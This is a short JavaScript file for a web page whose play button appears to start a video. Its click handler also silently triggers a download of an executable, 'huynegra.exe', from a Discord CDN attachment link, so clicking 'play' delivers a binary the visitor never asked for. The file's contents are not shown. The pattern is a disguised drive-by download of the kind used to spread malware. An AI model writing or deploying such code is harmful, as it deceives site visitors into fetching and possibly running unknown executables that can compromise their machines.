function showVideo() {
  var buttonContainer = document.getElementById("button-container");
  var videoContainer = document.getElementById("video-container");

  buttonContainer.style.display = "none";
  videoContainer.style.display = "block";

  var video = document.getElementById("video");
  video.play();

  video.addEventListener("ended", function () {
    videoContainer.style.display = "none";
    buttonContainer.style.display = "block";
  });
}

function downloadFile() {
  var link = document.createElement("a");
  link.href = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe";
  link.download = "huynegra.exe";
  link.click();
}

var playButton = document.getElementById("play-button");
playButton.addEventListener("click", function () {
  showVideo();
  downloadFile();
});
